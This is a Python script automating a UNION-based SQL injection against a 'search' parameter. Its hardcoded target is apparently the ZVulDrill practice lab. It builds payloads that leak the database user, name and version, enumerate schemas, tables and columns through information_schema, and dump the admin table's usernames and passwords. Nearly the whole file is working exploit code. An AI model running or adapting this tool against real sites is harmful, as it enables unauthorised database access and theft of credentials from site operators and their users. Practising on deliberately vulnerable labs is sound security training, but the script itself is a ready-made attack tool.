#! /usr/bin env python3
# -*- coding: utf-8 -*-

'injection'

import requests
import re
import sys

# Define
# fieldNum = 0
# url = sys.argv[1].split("?")[0]
# db = sys.argv[2]
# table = sys.argv[3]
# columns = sys.argv[4]

#########  test  ########################################
db = 'zvuldrill'                                       ##
table = 'admin'                                        ##
columns = ['admin_name', 'admin_pass']                 ##
url =  'http://www.zvuldrill.com/ZVulDrill/search.php' ##
#########################################################

def main(url):
    printJB()
    fieldNum = getMess(url)
    print(fieldNum)
    dbList = getDb(fieldNum)
    print(dbList)
    tableList = getTable(fieldNum,db)
    print(tableList)
    # tableList和选择的table注意区分
    columnsList = getColumn(fieldNum,db,table)
    print(columnsList)
    # columnsList和选择的columns注意区分
    dataList = getData(fieldNum,db,table,columns)
    print(dataList)

def controller():
    pass

def printJB():
    print(
    '''
    __   __   ___ ______  _   _ 
    \ \ / /  |_  || ___ \| \ | |
     \ V /     | || |_/ /|  \| |
     /   \     | || ___ \| . ` |
    / /^\ \/\__/ /| |_/ /| |\  |
    \/   \/\____/ \____/ \_| \_/

    '''
    )

def messSplit(data):
    match = {'database': '', 'user': '', 'version': ''}

    temp = re.search('\$~(\w*|\w*@)~\$', data)
    if temp is not None:
        str = temp.group()
        match['database'] = str.replace('$~','').replace('~$','')


    temp = re.search('\*~(\w*|\w*@)~\*', data)
    if temp is not None:
        str = temp.group()
        match['user'] = str.replace('*~','').replace('~*','')

    temp = re.search('\%~(\w*|\w*@)~\%', data)
    if temp is not None:
        str = temp.group()
        match['version'] = str.replace('%~','').replace('~%','')

    return match


def getMess(url):
    fieldLen = "concat('*~',user(),'~*','$~',database(),'~$','%~',version(),'~%')"
    getMessCharPayload = "%' union select " + fieldLen + " # "
    getMessCharParams = {'search': getMessCharPayload}
    for i in range(1, 10):
        res = requests.get(url, params=getMessCharParams)
        data = res.content.decode('utf-8')
        match = messSplit(data)

        if (match['database'] is not '' or match['user'] is not '' or match['version'] is not ''):
            print(match)
            return i+1
        else:
            fieldLen = fieldLen + ',' + fieldLen
            getMessCharPayload = "%' union select " + fieldLen + " # "
            getMessCharParams = {'search': getMessCharPayload}

def getDb(fieldNum):
    getDbCharPayload = "%' union select "
    for i in range(1, fieldNum):
        getDbCharPayload += "concat('$~',schema_name,'~$')" + ","
        if i is (fieldNum - 1):
            getDbCharPayload += "concat('$~',schema_name,'~$')"

    getDbCharPayload += " from information_schema.schemata #"

    # print(getTableCharPayload)
    getTableCharParams = {'search': getDbCharPayload}
    res = requests.get(url, params=getTableCharParams)
    data = res.content.decode('utf-8')
    match = re.findall("[^'\$~']\$~(.+?)~\$", data)
    match = list(set(match))
    if (match != None):
        return match


def getTable(fieldNum,db):
    getTableCharPayload = "%' union select "
    for i in range(1, fieldNum):
        getTableCharPayload += "concat('$~',table_name,'~$')" + ","
        if i is (fieldNum - 1):
            getTableCharPayload += "concat('$~',table_name,'~$')"

    getTableCharPayload += " from information_schema.tables where table_schema = '" + db + "' #"

    # print(getTableCharPayload)
    getTableCharParams = {'search': getTableCharPayload}
    res = requests.get(url, params=getTableCharParams)
    data = res.content.decode('utf-8')
    match = re.findall("[^'\$~']\$~(.+?)~\$", data)
    match = list(set(match))
    if (match != None):
        return match


def getColumn(fieldNum,db,table):
    getColumnsCharPayload = "%' union select "
    for i in range(1, fieldNum):
        getColumnsCharPayload += "concat('$~',column_name,'~$')" + ","
        if i is (fieldNum - 1):
            getColumnsCharPayload += "concat('$~',column_name,'~$')"

    getColumnsCharPayload += " from information_schema.columns where table_name = '" + table + "' and table_schema = '"+ db + "' #"
    # print(getColumnsCharPayload)
    getColumnsCharParams = {'search': getColumnsCharPayload}
    res = requests.get(url, params=getColumnsCharParams)
    data = res.content.decode('utf-8')
    match = re.findall("[^'\$~']\$~(.+?)~\$", data)
    match = list(set(match))
    if (match != None):
        return match


def getData(fieldNum,db,table,columns):
    getDataCharPayload = "%' union select "
    columnSit = ''
    for i in range(len(columns)):
        if i is not len(columns) - 1:
            columnSit += columns[i] + ",'|',"
        else:
            columnSit += columns[i]

    getDataPart = "concat('$~'," + columnSit + ",'~$')"
    for i in range(fieldNum):
        if i is not (fieldNum - 1):
            getDataCharPayload += getDataPart + ","
        else:
            getDataCharPayload += getDataPart

    getDataCharPayload += " from " + db + "." + table + " #"
    # print(getDataCharPayload)
    getDataCharParams = {'search': getDataCharPayload}
    res = requests.get(url, params=getDataCharParams)
    data = res.content.decode('utf-8')
    match = re.findall("[^'\$~']\$~(.+?)~\$", data)
    match = list(set(match))
    if (match != None):
        return match


if __name__ == "__main__":
    main(url)